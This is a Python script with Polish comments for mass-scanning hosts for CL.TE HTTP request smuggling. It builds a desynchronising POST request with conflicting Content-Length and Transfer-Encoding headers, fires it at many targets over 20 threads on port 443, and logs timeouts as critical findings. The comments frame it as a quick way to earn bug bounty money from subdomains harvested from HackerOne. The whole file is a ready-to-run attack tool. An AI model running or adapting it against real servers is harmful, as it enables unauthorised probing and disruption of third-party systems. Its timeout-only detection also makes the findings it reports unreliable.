import socket
import ssl
import threading
import time
from queue import Queue

# --- PARAMETRY OPERACYJNE ---
THREADS = 20            # Liczba jednoczesnych ataków
TIMEOUT = 7             # Czas na zawieszenie backendu (potwierdzenie luki)
OUTPUT_FILE = "findings_bounty.txt"

class ChaosSmuggler:
    """
    Silnik do masowego wykrywania luk Request Smuggling (CL.TE / TE.CL).
    Zaprojektowany dla Developera Chaosu do szybkiego bicia kasy na Bug Bounty.
    """
    
    def __init__(self):
        self.queue = Queue()
        self.lock = threading.Lock()

    def create_payload(self, host):
        """Tworzy zmanipulowane zapytanie desynchronizujące."""
        return (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"X"
        ).encode()

    def attack(self, host):
        """Próba przełamania logiki reasemblacji u celu."""
        payload = self.create_payload(host)
        
        try:
            # Obsługa zarówno HTTP (80) jak i HTTPS (443)
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(TIMEOUT)
            
            # Większość Bug Bounty to HTTPS
            conn = context.wrap_socket(sock, server_hostname=host)
            
            start = time.time()
            conn.connect((host, 443))
            conn.sendall(payload)
            
            try:
                # Jeśli serwer od razu rzuci błędem, luka jest prawdopodobnie załatana
                conn.recv(1024)
                return False
            except socket.timeout:
                # Jeśli nastąpił TIMEOUT po wysłaniu "X", backend utknął.
                # To jest 10,000$ w raporcie.
                duration = time.time() - start
                self.log_finding(host, duration)
                return True
            finally:
                conn.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
            return False

    def log_finding(self, host, duration):
        """Zapisuje dowód podatności w formacie gotowym do wysłania."""
        report = (
            f"\n[!!!] WYKRYTO KRYTYCZNĄ LUKĘ: {host}\n"
            f"Technika: CL.TE HTTP Request Smuggling\n"
            f"Opóźnienie: {duration:.2f}s (Przekroczono próg bezpieczeństwa)\n"
            f"Dowód (PoC):\n"
            f"Wysłano '0\\r\\nX' przy Content-Length: 4. Backend czeka na resztę danych.\n"
            f"{'='*50}\n"
        )
        with self.lock:
            print(report)
            with open(OUTPUT_FILE, "a") as f:
                f.write(report)

    def worker(self):
        while not self.queue.empty():
            target = self.queue.get()
            print(f"[*] Analiza: {target}...", end="\r")
            self.attack(target)
            self.queue.task_done()

    def run(self, targets):
        for t in targets:
            self.queue.put(t.strip())
        
        print(f"[*] Rozpoczynam Chaos Engine na {THREADS} wątkach...")
        for _ in range(THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
        
        self.queue.join()
        print(f"\n[*] Operacja zakończona. Sprawdź {OUTPUT_FILE}")

if __name__ == "__main__":
    # Tutaj wrzucasz subdomeny wyciągnięte np. z HackerOne
    targets_to_test = [
        "example.com", 
        "vulnerable-subdomain.target.com"
    ]
    
    engine = ChaosSmuggler()
    engine.run(targets_to_test)